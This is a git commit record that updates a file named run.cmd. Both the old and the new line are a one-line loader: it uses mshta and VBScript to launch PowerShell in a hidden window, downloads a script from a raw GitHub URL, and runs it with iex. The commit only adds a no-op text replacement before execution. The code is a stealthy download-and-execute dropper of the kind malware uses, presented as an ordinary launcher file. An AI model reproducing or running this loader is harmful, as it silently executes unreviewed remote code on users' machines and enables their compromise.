ae9c585346da3a2e2e3f3aae63764c7411fc1cf8
43a1723 <hai1723notgay@gmail.com>
2024-06-19 09:55:37 +0700

    Update run.cmd

--- run.cmd
+++ run.cmd
@@ -1,1 +1,1 @@
-mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -UseBasicParsing; iex $t",0))
+mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -UseBasicParsing; $t -replace 'skid', 'skid' | iex",0))
